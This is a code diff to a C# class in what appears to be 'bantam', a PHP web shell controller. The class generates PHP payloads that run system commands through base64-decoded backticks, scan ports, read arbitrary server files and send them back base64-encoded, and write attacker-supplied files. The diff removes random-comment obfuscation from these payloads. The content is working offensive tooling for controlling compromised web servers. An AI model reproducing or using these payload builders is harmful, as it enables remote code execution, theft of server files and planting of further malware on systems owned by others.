@@ -48,7 +48,6 @@ namespace bantam.Classes
         public const string windowsOS_Ver           = "ver";
         public const string posixOS_Whoami          = "whoami";
 
-
         public static string phpOb_Start = RandomPHPComment() + "@ob_start();" + RandomPHPComment();
         public static string phpOb_End = RandomPHPComment() + "$result = @ob_get_contents(); " + RandomPHPComment() + "@ob_end_clean();" + RandomPHPComment();
 
@@ -323,8 +322,7 @@ namespace bantam.Classes
             string hasResVar = RandomPHPVar();
 
             if (encryptResponse) {
-                return RandomPHPComment()
-                     + "$result='';"
+                return "$result='';"
                      + "@ini_set('max_execution_time', 0);"
                      + portsCode
                      + "foreach ($ports as " + portVar + ") {"
@@ -335,8 +333,7 @@ namespace bantam.Classes
                         + "}}"
                      + "if (empty($result)) { $result = 'None'; }";
             } else {
-                return RandomPHPComment()
-                     + hasResVar + "=0;"
+                return hasResVar + "=0;"
                      + "@ini_set('max_execution_time', 0);"
                      + portsCode
                      + "foreach ($ports as " + portVar + ") {"
@@ -439,7 +436,7 @@ namespace bantam.Classes
                     result = "echo `base64_decode('" + b64Code + "')`";
                 }
             }
-            return RandomPHPComment() + result + RandomPHPComment();
+            return result;
         }
 
         /// <summary>
@@ -455,9 +452,7 @@ namespace bantam.Classes
                       + "phpinfo();"
                       + phpOb_End;
             } else {
-                return RandomPHPComment()
-                       + "phpinfo();"
-                       + RandomPHPComment();
+                return "phpinfo();";
             }
         }
 
@@ -469,14 +464,9 @@ namespace bantam.Classes
         public static string PhpTestExecutionWithEcho1(bool encryptReponse)
         {
             if (encryptReponse) {
-                return RandomPHPComment()
-                     + "$result = '1';"
-                     + RandomPHPComment();
-
+                return "$result = '1';";
             } else {
-                return RandomPHPComment()
-                     + "echo '1';"
-                     + RandomPHPComment();
+                return "echo '1';";
             }
         }
 
@@ -521,13 +511,9 @@ namespace bantam.Classes
         public static string ReadFileFromVarToBase64(string fileName, bool encryptResponse)
         {
             if (encryptResponse) {
-                return RandomPHPComment()
-                     + "$result = @is_readable(" + fileName + ") ? @base64_encode(@file_get_contents(" + fileName + ")) : 'File Not Readable';"
-                     + RandomPHPComment();
+                return "$result = @is_readable(" + fileName + ") ? @base64_encode(@file_get_contents(" + fileName + ")) : 'File Not Readable';";
             } else {
-                return RandomPHPComment()
-                     + "echo @is_readable(" + fileName + ") ? @base64_encode(@file_get_contents(" + fileName + ")) : 'File Not Readable';"
-                     + RandomPHPComment();
+                return "echo @is_readable(" + fileName + ") ? @base64_encode(@file_get_contents(" + fileName + ")) : 'File Not Readable';";
             }
         }
 
@@ -540,13 +526,9 @@ namespace bantam.Classes
         public static string ReadFileToBase64(string fileName, bool encryptResponse)
         {
             if (encryptResponse) {
-                return RandomPHPComment()
-                     + "$result = @is_readable('" + fileName + "') ? @base64_encode(@file_get_contents('" + fileName + "')) : 'File Not Readable';"
-                     + RandomPHPComment();
+                return "$result = @is_readable('" + fileName + "') ? @base64_encode(@file_get_contents('" + fileName + "')) : 'File Not Readable';";
             } else {
-                return RandomPHPComment()
-                     + "echo @is_readable('" + fileName + "') ? @base64_encode(@file_get_contents('" + fileName + "')) : 'File Not Readable';"
-                     + RandomPHPComment();
+                return "echo @is_readable('" + fileName + "') ? @base64_encode(@file_get_contents('" + fileName + "')) : 'File Not Readable';";
             }
         }
 
@@ -558,9 +540,7 @@ namespace bantam.Classes
         /// <returns></returns>
         public static string WriteFile(string remoteFileLocation, string b64FileContents, string flags = "0")
         {
-            return RandomPHPComment()
-                 + "@file_put_contents('" + remoteFileLocation + "', base64_decode('" + b64FileContents + "'), " + flags + ");"
-                 + RandomPHPComment();
+            return "@file_put_contents('" + remoteFileLocation + "', base64_decode('" + b64FileContents + "'), " + flags + ");";
         }
 
         /// <summary>
@@ -571,9 +551,7 @@ namespace bantam.Classes
         /// <returns></returns>
         public static string WriteFileVar(string fileLocationVar, string b64FileContents, string flags = "0")
         {
-            return RandomPHPComment()
-                 + "@file_put_contents(" + fileLocationVar  + ", base64_decode('" + b64FileContents + "'), " + flags + ");"
-                 + RandomPHPComment();
+            return "@file_put_contents(" + fileLocationVar  + ", base64_decode('" + b64FileContents + "'), " + flags + ");";
         }
 
         /// <summary>
